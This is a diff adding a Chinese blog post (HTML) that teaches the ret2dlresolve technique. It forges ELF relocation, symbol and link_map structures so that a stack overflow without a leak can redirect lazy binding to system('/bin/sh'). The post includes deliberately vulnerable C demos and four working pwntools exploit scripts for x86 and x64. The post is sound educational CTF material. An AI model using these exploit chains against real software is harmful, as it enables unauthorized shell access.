@@ -1,0 +1,772 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>浅谈基于_dl_runtime_resolve的利用 | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="浅谈基于_dl_runtime_resolve的利用 | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="
+摆烂有一阵子了，忽然想起了前段时间dasctf3月赛的pwn1，就是无leak条件下的栈溢出。
+然后就想着把ret2dl好好总结一下。
+
+前置知识
+最好了解一下linux系统下程序的动态链接过程，以及elf结构中与动态链接有关的结构。
+可..." />
+    <meta name="keywords" content="tricks" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              浅谈基于_dl_runtime_resolve的利用
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-21
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/lEdq9BfNl/" class="post-tag">
+                  # tricks
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>摆烂有一阵子了，忽然想起了前段时间dasctf3月赛的pwn1，就是无leak条件下的栈溢出。</p>
+<p>然后就想着把ret2dl好好总结一下。</p>
+</blockquote>
+<h1 id="前置知识">前置知识</h1>
+<p>最好了解一下linux系统下程序的动态链接过程，以及elf结构中与动态链接有关的结构。</p>
+<p>可以参考一下ctf-wiki对ELF的介绍：<code>https://ctf-wiki.org/executable/elf/structure/basic-info/</code></p>
+<p>在linux中，程序会使用<code>_dl_runtime_resolve</code>对动态链接的函数进行重定位</p>
+<p>在分析之前，我们再简单复习一遍lazy binding机制：</p>
+<p>第一次调用库函数的时候，程序会先到他的plt表里，push了<code>_dl_runtime_resolve</code>的第二个参数<code>reloc_offset</code>，此时got表存的是他自己的plt表跳转过来的下一个语句，跳到公共的plt[0]处，push第一个参数<code>link_map</code>，最后调用<code>_dl_runtime_resolve</code>将重定向后的地址写到got表里。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/21/62d0982f8cead.png" alt="1650545108838.png" loading="lazy"></figure>
+<p>在<code>_dl_runtime_resolve</code>中有一个关键函数: <code>_dl_fixup</code>，它的原型如下：</p>
+<pre><code class="language-c">DL_FIXUP_VALUE_TYPE
+attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
+_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
+</code></pre>
+<p>他的两个参数其实都可以被加以利用。</p>
+<p>（以下示例如非特殊说明，均是在ubuntu20.04下测试的）</p>
+<h1 id="x86">x86</h1>
+<h2 id="no-relro">NO RELRO</h2>
+<p>这种情况出现的很少，这里就不详细介绍了。</p>
+<p>在NO RELRO时，<code>.dynamic</code>段是可写的，把其中的<code>DT_STRTAB</code>劫持到一个已知地址，然后在已知地址上伪造好一个fake_strtab，将<code>read</code>的位置改成system，然后正常劫持<code>_dl_runtime_resolve</code>即可。</p>
+<p>（详细过程在x64下写）</p>
+<h2 id="partial-relro">PARTIAL RELRO</h2>
+<h3 id="利用reloc_arg">利用reloc_arg</h3>
+<h4 id="分析">分析</h4>
+<p>下面我们来看一个例子：</p>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+void fun(){
+	char buf[0x20];
+	read(0, buf, 0x100);
+}
+int main(){
+	fun();
+	return 0;
+}
+</code></pre>
+<p>使用以下指令编译：</p>
+<pre><code>gcc ret2dl.c -o ret2dl -m32 -fno-stack-protector -no-pie -z relro
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/a8113e3bc50be.png" alt="1650781037825.png" loading="lazy"></figure>
+<p>只开启Partial RELRO和NX，洞也是非常简单的栈溢出，但是没有用于leak的函数。我们尝试用ret2dlresolve来pwn掉它。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/21/8cc3d5dd226a8.png" alt="1650544684766.png" loading="lazy"></figure>
+<p>以第一次调用raed为例，我们trace进去，发现在read的plt表里先是跳到了read的got表，而got表还未绑定到read上，存的就是read的plt跳转之后的那一句指令的地址，这个时候就会将一个0压栈（这就是之后调用<code>_dl_runtime_resolve</code>的第二个参数，<code>reloc_offset</code>），然后跳到plt[0]上，将link_map压栈，调用<code>_dl_runtime_resolve</code>。</p>
+<p>继续跟进，</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/756485c6f4edf.png" alt="1650781224696.png" loading="lazy"></figure>
+<p>看到它调用了<code>_dl_fixup</code>，部分源码如下</p>
+<pre><code class="language-c">_dl_fixup(struct link_map *l,ElfW(Word) reloc_arg)
+{
+	const PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
+	const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
+	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);
+	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : 0);
+	return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	
+}
+</code></pre>
+<p>首先通过第二个参数reloc_offset在.rel.plt上找到一个ELF32_Rel结构体，</p>
+<pre><code class="language-c">typedef struct {
+    Elf32_Addr    r_offset;
+    Elf32_Word    r_info;
+} Elf32_Rel;
+</code></pre>
+<p>其中，r_offset指向该函数的got表地址，(r_info&gt;&gt;8)是该函数对于.dynamic基地址的偏移</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/e55322db11f32.png" alt="1650782070783.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/1c7d18d73b08a.png" alt="1650782298465.png" loading="lazy"></figure>
+<p>ELF32_Sym结构体的第一个元素就是对象函数的函数名字符串相对于ELF String Table的偏移</p>
+<p>不难发现，这些结构都在bss段之前，所以伪造这些结构之前，先把栈迁移到bss段上就会好伪造很多了。</p>
+<p>首先准备好需要用到的地址和gadgets</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/ecc1c4ac4620e.png" alt="1650783891497.png" loading="lazy"></figure>
+<p>然后利用原本的栈溢出去读后面一部分的payload到bss段上，然后迁移上去（最好将这个地址抬高一部分，不然调用<code>_dl_runtime_resolve</code>会破坏掉bss段之前的内容）</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/486ef1088ee36.png" alt="1650784014065.png" loading="lazy"></figure>
+<p>然后就是伪造ELF32_Rel和ELF32_Sym这两个结构了，</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/24/ea0746549d125.png" alt="1650784064607.png" loading="lazy"></figure>
+<p>要注意的是，fake_sym_addr到.dynsym的偏移一定要是0x10的整数倍，并且伪造的ELF32_Rel中的r_info得通过<code>_dl_fixup</code>中的检查，即将该偏移按位与上一个7（<em>R_386_JMUP_SLOT</em>）。</p>
+<p>然后就能成功getshell了。</p>
+<h4 id="exp">exp</h4>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='i386', log_level='debug')
+elf = ELF('./ret2dl')
+p = process('./ret2dl')
+
+# gadgets
+ppp_ret = 0x08049251 # pop esi ; pop edi ; pop ebp ; ret
+pop_ebp = 0x08049253 # pop ebp ; ret
+leave_ret = 0x08049105 # leave ; ret
+
+# addr
+read_plt = elf.plt['read']
+read_got = elf.got['read']
+rel_plt = 0x8048314
+dynsym = 0x8048248
+string_table = 0x8048298
+bss_inf = 0x804c000 + 0x800
+plt_0 = 0x8049030
+
+pay = b'a'*0x2c + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(bss_inf) + p32(0x100)
+pay += p32(pop_ebp) + p32(bss_inf) + p32(leave_ret)
+p.sendline(pay)
+
+# gdb.attach(p)
+
+fake_sym_addr = bss_inf + 0x38
+fake_sym = p32(bss_inf+0x20-string_table) + p32(0) + p32(0) + p32(12)
+r_info = (((fake_sym_addr-dynsym)//16)&lt;&lt;8)|7
+fake_read_addr = bss_inf + 0x30
+reloc_offset = fake_read_addr-rel_plt
+fake_read = p32(read_got) + p32(r_info)
+
+cmd_addr = bss_inf + 0x28
+pay = b'aaaa' + p32(plt_0) + p32(reloc_offset) + p32(0) # _dl_runtime_resolve
+pay += p32(cmd_addr) + p32(0)*3
+pay += b'system\x00\x00' + b'/bin/sh\x00'
+pay += fake_read + fake_sym
+p.sendline(pay)
+
+p.interactive()
+</code></pre>
+<h1 id="x64">x64</h1>
+<h2 id="no-relro-2">NO RELRO</h2>
+<h3 id="hijack-string-table">hijack string table</h3>
+<p><strong>ret2dl.c</strong></p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;unistd.h&gt;
+
+void init(){
+	setbuf(stdin, 0);
+	setbuf(stdout, 0);
+	setbuf(stderr, 0);
+}
+
+void fun(){
+	char buf[0x20];
+	read(0, buf, 0x100);
+}
+
+int main(){
+	init();
+	fun();
+	return 0;
+}
+</code></pre>
+<p><strong>编译命令</strong></p>
+<pre><code class="language-shell">gcc ./ret2dl.c -o ret2dl -no-pie -fno-stack-protector -z norelro
+</code></pre>
+<h4 id="分析-2">分析</h4>
+<p>NO RELRO时，<code>.dynamic</code>段是可写的，其中记录了<code>string table</code>的地址，我们可以把他劫持到一个伪造的地方</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/25/f83437a787c98.png" alt="1666683694868.png" loading="lazy"></figure>
+<p>这里直接劫持setbuf，简单调一下setbuf在<code>.rel.plt</code>的偏移</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/25/c98772481b1e1.png" alt="1666683844020.png" loading="lazy"></figure>
+<p>（当然也可以直接在ida里看，我只是觉得动调看方便一点）</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/25/d16ce8040bc90.png" alt="1666684327826.png" loading="lazy"></figure>
+<p>记住这个<code>reloc_arg</code>是<code>0</code>，后面触发劫持时就用<code>plt[0]</code>，然后栈上准备一个<code>0</code>（不能调用<code>setbuf@plt</code>来劫持，因为在<code>init</code>中已经调用过了<code>setbuf@plt</code>，<code>setbuf@got</code>就已经指向libc中的<code>setbuf</code>地址了，并不会触发后续的<code>_dl_fixup</code>）</p>
+<p>由于x64是寄存器传参，所以总的来说比x86方便很多。（但是<code>_dl_fixup</code>的参数任然是通过栈来传参的，这一点暂不知道原因，估计是plt表设计上的方便问题吧）</p>
+<h4 id="exp-2">exp</h4>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+p = process('./ret2dl')
+elf = ELF('./ret2dl')
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+pop_rdi     = 0x0000000000401253 # pop rdi ; ret
+pop_rsi_r15 = 0x0000000000401251 # pop rsi ; pop r15 ; ret
+plt_0       = 0x401020
+
+fake_strtab = b&quot;\x00libc.so.6\x00stdin\x00read\x00stdout\x00stderr\x00system\x00&quot;
+strtab_addr = 0x403230
+binsh       = 0x4033f0
+fake_strtab_addr = binsh+0x10
+
+pay = b'a'*0x28
+pay += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(binsh) + p64(0)
+pay += p64(elf.plt['read'])
+
+pay += p64(pop_rsi_r15) + p64(strtab_addr) + p64(0) + p64(elf.plt['read'])
+
+pay += p64(pop_rdi) + p64(binsh) + p64(plt_0) + p64(0)
+
+p.sendline(pay)
+p.sendline(b'/bin/sh\x00'.ljust(0x10, b'\x00')+fake_strtab)
+p.sendline(p64(fake_strtab_addr))
+
+p.interactive()
+</code></pre>
+<h2 id="partial-relro-2">PARTIAL RELRO</h2>
+<h3 id="利用reloc_arg-2">利用reloc_arg</h3>
+<h4 id="分析-3">分析</h4>
+<p>还是使用<code>x64-NO RELRO</code>中的<code>ret2dl.c</code>，编译指令调整如下：</p>
+<pre><code class="language-shell">gcc ./ret2dl.c -o ret2dl -no-pie -fno-stack-protector
+</code></pre>
+<p>（修改reloc_arg的利用思路和x86下差不多，但是在<code>_dl_fixup</code>中存在诸多不稳定因素，通常会在<code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code>这一句报错，而想要不进入这个语句，需要让<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</code>，这就需要在libc上的linkmap中进行修改了，和本解法存在一定的矛盾，所以不建议在x64下打这个分支。）</p>
+<p>这里就说一下和x86的差别吧。</p>
+<p>首先是某些结构体发生的变化，<code>Elf64_Sym</code>变成了这样</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/25/203d29880fd25.png" alt="1666701273990.png" loading="lazy"></figure>
+<p>一个还是占0x18字节，但值得注意的是，前面的symbol相对于strtab的偏移，和0x12那里，依然只占4bytes</p>
+<p>变化比较大的是<code>Elf64_Rela</code></p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/25/538c260181831.png" alt="1666701435695.png" loading="lazy"></figure>
+<p>它变成了0x18的大小，而且后续在<code>_dl_fixup</code>中利用<code>reloc_arg</code>索引他的方式变成了<strong>按结构体下标索引</strong>，所以伪造在bss上的fake_rel的地址<strong>必须对0x18对齐</strong>。</p>
+<p>此外，由于x64下<code>_dl_runtime_resolve_xsave</code>函数调用层数比较多，所以栈迁到bss上的地址还需要进一步抬高，保证稳定性。</p>
+<h4 id="exp-3">exp</h4>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+
+p = process('./ret2dl')
+elf = ELF('./ret2dl')
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+pop_rdi = 0x0000000000401253 # pop rdi ; ret
+pop_rsi_r15 = 0x0000000000401251 # pop rsi ; pop r15 ; ret
+ppp_ret = 0x000000000040124f # pop rbp ; pop r14 ; pop r15 ; ret
+leave_ret = 0x00000000004011c0 # leave ; ret
+
+rel_plt = 0x400590
+plt_0 = 0x401020
+bss_info = 0x404070 + 0x500 + 0x780
+
+pay = b'a'*0x28
+pay += p64(pop_rsi_r15) + p64(bss_info) + p64(0)
+pay += p64(elf.plt['read'])
+
+pay += p64(ppp_ret) + p64(bss_info) + p64(0)*2 + p64(leave_ret) # stack pivoting
+
+p.sendline(pay)
+
+fake_setbuf_rel_addr = bss_info + 0x28 + 0x18
+fake_setbuf_sym_addr = fake_setbuf_rel_addr + 0x20
+reloc_arg = (fake_setbuf_rel_addr - rel_plt)//24
+
+symtab_addr = 0x4003d0
+strtab_addr = 0x400490
+fake_setbuf_sym = p32(bss_info+0x30-strtab_addr) + p32(0x12) + p64(0)*2
+
+r_info = (((fake_setbuf_sym_addr-symtab_addr)//24)&lt;&lt;32) + 7
+fake_setbuf_rel = p64(elf.got['setbuf']) + p64(r_info) + p64(0)*2
+
+pay = b'/bin/sh\x00'
+pay += p64(pop_rdi) + p64(bss_info)
+pay += p64(plt_0) + p64(reloc_arg) + p64(0) + b'system\x00\x00' + p64(0)
+pay += fake_setbuf_rel
+pay += fake_setbuf_sym
+
+p.sendline(pay)
+
+p.interactive()
+</code></pre>
+<h3 id="伪造link_map">伪造link_map</h3>
+<h4 id="分析-4">分析</h4>
+<p>由于利用<code>reloc_arg</code>的链子非常容易访问到非法地址，所以并不常用。</p>
+<p>在可控范围非常大的时候（&gt;=0x100），往往都会采用伪造<code>link_map</code>的手法来实现ret2dl的攻击。</p>
+<p>再看**_dl_fixup**的源码：</p>
+<pre><code class="language-c">DL_FIXUP_VALUE_TYPE
+attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
+_dl_fixup (
+# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
+	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
+# endif
+	   struct link_map *l, ElfW(Word) reloc_arg)
+{
+    ......
+    if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0){
+        ......
+    }
+    else
+    {
+      	/* We already found the symbol.  The module (and therefore its load
+	 	address) is also known.  */
+      	value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
+      	result = l;
+    }
+	/* And now perhaps the relocation addend.  */
+  	value = elf_machine_plt_value (l, reloc, value);
+
+  	if (sym != NULL
+      	&amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
+    	value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+
+  	/* Finally, fix up the plt itself.  */
+  	if (__glibc_unlikely (GLRO(dl_bind_not)))
+    	return value;
+
+  	return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
+}
+</code></pre>
+<p>这一次我们需要让<code>__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) != 0</code>，进入到else的分支下。</p>
+<p><code>value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));</code></p>
+<p>这里调用了<code>SYMBOL_ADDRESS(map, ref, map_set)</code>这个宏</p>
+<pre><code class="language-c">typedef struct link_map *lookup_t;
+#define LOOKUP_VALUE(map) map
+#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)
+
+/* Calculate the address of symbol REF using the base address from map MAP,
+   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */
+#define SYMBOL_ADDRESS(map, ref, map_set)				\
+  ((ref) == NULL ? 0							\
+   : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? 0			\
+      : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)-&gt;st_value)
+</code></pre>
+<p>可以看出，当<code>sym-&gt;st_shndx != SHN_ABS</code>时，最终绑定的<code>value</code>会等于<code>l-&gt;addr + sym-&gt;st_value</code></p>
+<p>所以当<code>sym-&gt;st_value</code>为某个libc上的地址，然后<code>l-&gt;addr</code>为那个地址距离<code>system</code>的偏移时，可以成功劫持绑定</p>
+<p>这里给出一些相关结构体的定义：</p>
+<ul>
+<li><strong>Elf64_Dyn</strong></li>
+</ul>
+<pre><code class="language-c">typedef struct
+{
+  Elf64_Sxword	d_tag;			/* Dynamic entry type */
+  union
+    {
+      Elf64_Xword d_val;		/* Integer value */
+      Elf64_Addr d_ptr;			/* Address value */
+    } d_un;
+} Elf64_Dyn;
+</code></pre>
+<ul>
+<li><strong>Elf64_Rela</strong></li>
+</ul>
+<pre><code class="language-c">typedef struct
+{
+  Elf64_Addr	r_offset;		/* Address */
+  Elf64_Xword	r_info;			/* Relocation type and symbol index */
+  Elf64_Sxword	r_addend;		/* Addend */
+} Elf64_Rela;
+</code></pre>
+<ul>
+<li><strong>Elf64_Sym</strong></li>
+</ul>
+<pre><code class="language-c">typedef struct
+{
+  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
+  unsigned char	st_info;		/* Symbol type and binding */
+  unsigned char st_other;		/* Symbol visibility */
+  Elf64_Section	st_shndx;		/* Section index */
+  Elf64_Addr	st_value;		/* Symbol value */
+  Elf64_Xword	st_size;		/* Symbol size */
+} Elf64_Sym;
+</code></pre>
+<ul>
+<li><strong>link_map</strong></li>
+</ul>
+<pre><code class="language-c">struct link_map
+  {
+    /* These first few members are part of the protocol with the debugger.
+       This is the same format used in SVR4.  */
+
+    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
+				   file and the addresses in memory.  */
+    char *l_name;		/* Absolute file name object was found in.  */
+    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
+    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+  };
+</code></pre>
+<p>（这里的link_map结构是我在源码<strong>link.h</strong>中找的，实际上后续还有一段，可以参考gdb中调出来的结果计算偏移）</p>
+<pre><code class="language-c">pwndbg&gt; p *(struct link_map *) 0x7ffff7ffe190
+$1 = {
+  l_addr = 0,
+  l_name = 0x7ffff7ffe730 &quot;&quot;,
+  l_ld = 0x403e20,
+  l_next = 0x7ffff7ffe740,
+  l_prev = 0x0,
+  l_real = 0x7ffff7ffe190,
+  l_ns = 0,
+  l_libname = 0x7ffff7ffe718,
+  l_info = {0x0, 0x403e20, 0x403f00, 0x403ef0, 0x0, 0x403ea0, 0x403eb0, 0x403f30, 0x403f40, 0x403f50, 0x403ec0, 0x403ed0, 0x403e30, 0x403e40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403f10, 0x403ee0, 0x0, 0x403f20, 0x0, 0x403e50, 0x403e70, 0x403e60, 0x403e80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403f70, 0x403f60, 0x0 &lt;repeats 13 times&gt;, 0x403f80, 0x0 &lt;repeats 25 times&gt;, 0x403e90},
+  l_phdr = 0x400040,
+  l_entry = 4198512,
+  l_phnum = 13,
+  l_ldnum = 0,
+  l_searchlist = {
+    r_list = 0x7ffff7faf520,
+    r_nlist = 3
+  },
+  l_symbolic_searchlist = {
+    r_list = 0x7ffff7ffe710,
+    r_nlist = 0
+  },
+  l_loader = 0x0,
+  l_versions = 0x7ffff7faf540,
+  l_nversions = 3,
+  l_nbuckets = 3,
+  l_gnu_bitmask_idxbits = 0,
+  l_gnu_shift = 6,
+  l_gnu_bitmask = 0x4003b0,
+  {
+    l_gnu_buckets = 0x4003b8,
+    l_chain = 0x4003b8
+  },
+  {
+    l_gnu_chain_zero = 0x4003b0,
+    l_buckets = 0x4003b0
+  },
+  l_direct_opencount = 1,
+  l_type = lt_executable,
+  l_relocated = 1,
+  l_init_called = 1,
+  l_global = 1,
+  l_reserved = 0,
+  l_phdr_allocated = 0,
+  l_soname_added = 0,
+  l_faked = 0,
+  l_need_tls_init = 0,
+  l_auditing = 0,
+  l_audit_any_plt = 0,
+  l_removed = 0,
+  l_contiguous = 0,
+  l_symbolic_in_local_scope = 0,
+  l_free_initfini = 0,
+  l_nodelete_active = false,
+  l_nodelete_pending = false,
+  l_cet = 7,
+  l_rpath_dirs = {
+    dirs = 0xffffffffffffffff,
+    malloced = 0
+  },
+  l_reloc_result = 0x0,
+  l_versyms = 0x4004e8,
+  l_origin = 0x0,
+  l_map_start = 4194304,
+  l_map_end = 4210800,
+  l_text_end = 4199029,
+  l_scope_mem = {0x7ffff7ffe450, 0x0, 0x0, 0x0},
+  l_scope_max = 4,
+  l_scope = 0x7ffff7ffe4f8,
+  l_local_scope = {0x7ffff7ffe450, 0x0},
+  l_file_id = {
+    dev = 0,
+    ino = 0
+  },
+  l_runpath_dirs = {
+    dirs = 0xffffffffffffffff,
+    malloced = 0
+  },
+  l_initfini = 0x7ffff7faf500,
+  l_reldeps = 0x0,
+  l_reldepsmax = 0,
+  l_used = 1,
+  l_feature_1 = 0,
+  l_flags_1 = 0,
+  l_flags = 0,
+  l_idx = 0,
+  l_mach = {
+    plt = 0,
+    gotplt = 0,
+    tlsdesc_table = 0x0
+  },
+  l_lookup_cache = {
+    sym = 0x400478,
+    type_class = 2,
+    value = 0x7ffff7faf000,
+    ret = 0x7ffff7dc9548
+  },
+  l_tls_initimage = 0x0,
+  l_tls_initimage_size = 0,
+  l_tls_blocksize = 0,
+  l_tls_align = 0,
+  l_tls_firstbyte_offset = 0,
+  l_tls_offset = 0,
+  l_tls_modid = 0,
+  l_tls_dtor_count = 0,
+  l_relro_addr = 4210192,
+  l_relro_size = 496,
+  l_serial = 0
+}
+</code></pre>
+<p>其中，<code>l_info</code>数组存的是动态链接用到的各种表的地址，比较重要的偏移我调了一下：</p>
+<ul>
+<li>
+<p><code>DT_STRTAB</code>: 5 (link_map_addr + 0x40 + 0x28)</p>
+</li>
+<li>
+<p><code>DT_SYMTAB</code>: 6 (link_map_addr + 0x40 + 0x30)</p>
+</li>
+<li>
+<p><code>DT_JMPREL</code>: 23 (link_map_addr + 0x40 + 0xb8)</p>
+</li>
+</ul>
+<p>总结一下构造的条件大概如下：</p>
+<ul>
+<li>构造<code>l_addr</code>为libc上<code>system</code>到<code>setbuf</code>的偏移</li>
+<li>让<code>l_info[DT_SYMTAB]</code>和<code>l_info[DT_JMPREL]</code>分别指向自己伪造好的<code>symtab</code>和<code>.rel.plt</code>对应的<code>Elf64_Dyn</code>结构体的位置，然后再分别让他们的<code>d_ptr</code>指向<code>Elf64_Sym</code>和<code>Elf64_Rela</code>结构体附近（要注意算好偏移，推荐直接让<code>reloc_arg</code>为0，这样比较方便）</li>
+<li>让<code>l_info[DT_STRTAB]</code>为原来的string table的地址，否则在<code>_dl_runtime_resolve_xsave</code>中可能会访问到非法地址导致crash</li>
+</ul>
+<p>在空间不是很足的时候（比如我这个demo，一次最多只能读0x100），可以考虑在link_map上进行空间复用，详细的构造方式可以参考我下面的exp。</p>
+<h4 id="exp-4">exp</h4>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+
+p = process('./ret2dl')
+elf = ELF('./ret2dl')
+libc = elf.libc
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+pop_rdi = 0x0000000000401253 # pop rdi ; ret
+pop_rsi_r15 = 0x0000000000401251 # pop rsi ; pop r15 ; ret
+
+rel_plt = 0x400590
+plt_0 = 0x401026
+bss_info = 0x404070 + 0x500
+
+pay = b'a'*0x28 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_info) + p64(0)
+pay += p64(elf.plt['read'])
+pay += p64(pop_rdi+1) + p64(pop_rdi) + p64(bss_info+0x8) # binsh addr
+pay += p64(plt_0) + p64(bss_info) + p64(0) # hijack _dl_runtime_resolve_xsave -&gt; system
+
+l_addr = (libc.symbols['system']-libc.symbols['setbuf'])&amp;0xffffffffffffffff
+
+linkmap = p64(l_addr) # l_addr
+linkmap += b'/bin/sh\x00'
+linkmap = linkmap.ljust(0x30, b'\x00')
+linkmap += p64((bss_info + 0x30 - l_addr)&amp;0xffffffffffffffff) # fake Elf64_Rela
+linkmap += p64(0x7) # ELF_MACHINE_JMP_SLOT
+linkmap = linkmap.ljust(0x68, b'\x00')
+linkmap += p64(0x400490) # DT_STRTAB
+linkmap += p64(bss_info + 0x70) # DT_SYMTAB addr &amp; fake (Elf64_Dyn*)(symtab-&gt;d_tag)
+linkmap += p64(elf.got['setbuf']-0x8) # fake (Elf64_Dyn*)(symtab-&gt;d_ptr)
+linkmap += p64(bss_info + 0x30) # fake (ELF64_Dyn*)(jmprel-&gt;d_ptr)
+linkmap = linkmap.ljust(0xf8, b'\x00')
+linkmap += p64(bss_info + 0x80 - 0x8) # DT_JMPREL
+
+p.sendline(pay)
+p.send(linkmap)
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a></li>
+<li><a href="#x86">x86</a>
+<ul>
+<li><a href="#no-relro">NO RELRO</a></li>
+<li><a href="#partial-relro">PARTIAL RELRO</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8reloc_arg">利用reloc_arg</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
